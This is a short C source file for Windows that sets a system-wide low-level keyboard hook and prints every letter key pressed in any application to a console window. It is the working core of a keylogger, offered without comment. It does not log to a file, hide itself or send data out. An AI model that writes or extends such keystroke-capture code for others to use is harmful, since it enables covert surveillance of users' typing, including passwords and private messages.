#include <Windows.h>
#include <stdio.h>


HHOOK _hook;

KBDLLHOOKSTRUCT kbdStruct;

LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam)
{
    if (nCode >= 0)
    {

        if (wParam == WM_KEYDOWN)
        {

            kbdStruct = *((KBDLLHOOKSTRUCT*)lParam);
			
			switch (kbdStruct.vkCode)
			{
			case(0x41):
				printf("a");
				break;
			case(0x42):
				printf("b");
				break;
			case(0x43):
				printf("c");
				break;
			case(0x44):
				printf("d");
				break;
			case(0x45):
				printf("e");
				break;
			case(0x46):
				printf("f");
				break;
			case(0x47):
				printf("g");
				break;
			case(0x48):
				printf("h");
				break;
			case(0x49):
				printf("i");
				break;
			case(0x4a):
				printf("j");
				break;
			case(0x4b):
				printf("k");
				break;
			case(0x4c):
				printf("l");
				break;
			case(0x4d):
				printf("m");
				break;
			case(0x4e):
				printf("n");
				break;
			case(0x4f):
				printf("o");
				break;
			case(0x50):
				printf("p");
				break;
			case(0x51):
				printf("q");
				break;
			case(0x52):
				printf("r");
				break;
			case(0x53):
				printf("s");
				break;
			case(0x54):
				printf("t");
				break;
			case(0x55):
				printf("u");
				break;
			case(0x56):
				printf("v");
				break;
			case(0x57):
				printf("w");
				break;
			case(0x58):
				printf("x");
				break;
			case(0x59):
				printf("y");
				break;
			case(0x5a):
				printf("z");
				break;

			default:
				break;
			}
        }
    }

    
    return CallNextHookEx(_hook, nCode, wParam, lParam);
}

void SetHook()
{
   
    if (!(_hook = SetWindowsHookEx(WH_KEYBOARD_LL, HookCallback, NULL, 0)))
    {
        MessageBox(NULL, "Failed to install hook!", "Error", MB_ICONERROR);
    }
}

void ReleaseHook()
{
    UnhookWindowsHookEx(_hook);
}

void main()
{
    
    SetHook();

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0))
    {

    }
}  
